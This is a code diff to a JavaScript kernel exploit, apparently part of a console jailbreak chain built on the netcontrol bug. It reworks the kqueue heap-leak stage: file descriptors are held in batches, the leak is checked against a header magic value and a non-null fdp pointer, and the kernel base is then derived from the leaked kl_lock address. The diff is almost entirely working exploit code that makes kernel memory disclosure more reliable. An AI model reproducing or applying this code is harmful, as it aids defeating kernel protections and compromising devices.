@@ -18,7 +18,10 @@ const NC_NUM_ATTEMPT_TWINS = 0x10;
 const NC_NUM_ATTEMPT_TRIPLETS = 0x10;
 const NC_NUM_IOV_SPRAY = 0x100;
 const NC_NUM_UIO_SPRAY = 0x100;
-const NC_NUM_LEAK_KQUEUE = 0x200;
+const NC_NUM_LEAK_KQUEUE = 5000;
+const NC_KQ_HDR_MAGIC = 0x1430000;
+const NC_KQ_LEAK_SIZE = 0xa0;
+const NC_KQ_BATCH = 8;
 
 const NC_NETEVENT_SET_QUEUE = 0x20000003;
 const NC_NETEVENT_CLEAR_QUEUE = 0x20000007;
@@ -453,29 +456,73 @@ function nc_leak_kqueue() {
 
   free_rthdr(nc_triplets[2]);
 
-  let kq;
-  let leaked = false;
-  for (let i = 0; i < NC_NUM_LEAK_KQUEUE; i++) {
-    kq = fn.kqueue.invoke();
-    if (kq === -1) throw new SyscallError('Unable to get kqueue !!');
+  const held = [];
+  const close_held = (keep) => {
+    while (held.length > 0) {
+      const fd = held.pop();
+      if (fd === keep) continue;
 
-    get_rthdr(nc_triplets[0], KQUEUE_SIZE);
-    if (arw.view(leak_rthdr0_addr).getBInt(8, true).eq(0x1430000)) {
+      if (fn.close.invoke(fd) === -1) {
+        throw new SyscallError(`Unable to close kqueue fd ${fd} !!`);
+      }
+    }
+  };
+
+  let kq = -1;
+  let leaked = false;
+  let magic_no_fdp = 0;
+
+  for (let i = 0; i < NC_NUM_LEAK_KQUEUE; i++) {
+    const fd = fn.kqueue.invoke();
+    if (fd === -1) {
+      close_held(-1);
+      continue;
+    }
+
+    held.push(fd);
+    kq = fd;
+
+    let got = 0;
+    try {
+      got = get_rthdr(nc_triplets[0], NC_KQ_LEAK_SIZE);
+    } catch (err) {
+      got = 0;
+    }
+
+    const view = arw.view(leak_rthdr0_addr);
+    const magic_ok = got >= NC_KQ_LEAK_SIZE
+      && view.getUint32(8, true) === NC_KQ_HDR_MAGIC
+      && view.getUint32(12, true) === 0;
+    const kq_fdp = view.getBInt(0x98, true);
+
+    // The magic alone is not enough: it can appear before the fdp pointer is
+    // filled in. The verified chain rejects those and keeps trying.
+    if (magic_ok && kq_fdp.neq(0)) {
       logger.debug(`Leaked kqueue after ${i} iterations !!`);
       leaked = true;
       break;
     }
 
-    if (fn.close.invoke(kq) === -1) {
-      throw new SyscallError(`Unable to close kqueue fd ${kq} !!`);
+    if (magic_ok) magic_no_fdp++;
+
+    if (held.length >= NC_KQ_BATCH) {
+      close_held(-1);
     }
   }
 
-  if (!leaked) throw new Error('Unable to leak kqueue !!');
+  if (!leaked) {
+    close_held(-1);
+    throw new Error(`Unable to leak kqueue (magic without kq_fdp: ${magic_no_fdp}) !!`);
+  }
+
+  // Keep the leaked kqueue alive until its header has been read.
+  close_held(kq);
+
   logger.info('Leaked kqueue !!');
 
-  const kl_lock = arw.view(leak_rthdr0_addr).getBInt(0x60, true);
-  const kq_fdp = arw.view(leak_rthdr0_addr).getBInt(0x98, true);
+  const view = arw.view(leak_rthdr0_addr);
+  const kl_lock = view.getBInt(0x60, true);
+  const kq_fdp = view.getBInt(0x98, true);
   kernel_base = kl_lock.sub(impl.k_kl_lock);
 
   logger.debug(`kl_lock: ${kl_lock}`);
